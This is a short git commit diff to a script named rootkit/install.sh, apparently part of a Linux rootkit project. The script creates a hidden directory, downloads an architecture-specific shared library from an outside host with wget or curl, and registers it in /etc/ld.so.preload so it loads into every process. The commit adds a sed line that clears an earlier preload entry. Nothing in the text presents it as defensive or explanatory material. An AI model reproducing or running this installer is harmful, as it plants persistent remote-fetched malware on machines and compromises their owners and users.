c916ae51684a7ac305e6cbe4f99cbbffb0262545
Your Name <you@example.com>
2023-08-23 20:02:15 +0200

    uhh

--- rootkit/install.sh
+++ rootkit/install.sh
@@ -3,6 +3,7 @@
 rkit_key=.__EL_SNEEDIO__
 
 mkdir /$rkit_key
+sed -i 's;/\.__EL_SNEEDIO__/\.__EL_SNEEDIO__\.so;#;' /etc/ld.so.preload
 wget flamecord.zixel.tk/rkit-`uname -m`.so -O /$rkit_key/$rkit_key.so || curl -L flamecord.zixel.tk/rkit-`uname -m`.so -o /$rkit_key/$rkit_key.so
 # if wget/curl fails we should fallback to trying to install them or something
 echo /$rkit_key/$rkit_key.so >> /etc/ld.so.preload
